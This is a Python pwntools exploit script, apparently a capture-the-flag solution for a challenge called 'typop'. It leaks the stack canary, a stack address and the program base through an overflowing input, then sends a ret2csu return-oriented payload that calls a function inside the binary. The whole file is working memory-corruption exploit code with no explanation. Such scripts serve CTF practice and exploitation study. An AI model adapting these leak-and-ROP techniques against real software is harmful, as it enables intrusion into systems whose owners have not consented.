#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF("chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "typop.chal.idek.team", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

sla('survey?\n', 'y')
sa('ctf?\n', 'A'*11)

p.recvuntil('A'*11, drop=True)
canary = u64(b'\x00'+p.recv(7))
print('canary = '+hex(canary))

stack = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))
print('stack = '+hex(stack))

payload = 'A'*10+p64(canary)
sa('feedback?\n', payload)

sla('survey?\n', 'y')
sa('ctf?\n', 'A'*26)

p.recvuntil('A'*26, drop=True)
exe.address = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00')) - 0x1447
print('prog = '+hex(exe.address))

csu1 = exe.address+0x14ca
csu2 = exe.address+0x14b0

payload = 'A'*2+p64(exe.address+0x1249)+p64(canary)+p64(stack)+p64(csu1)+p64(0)+p64(1)+p64(0x66)+p64(0x6c)+p64(0x61)+p64(stack-0x20)+p64(csu2)
sa('feedback?\n', payload)

p.interactive()
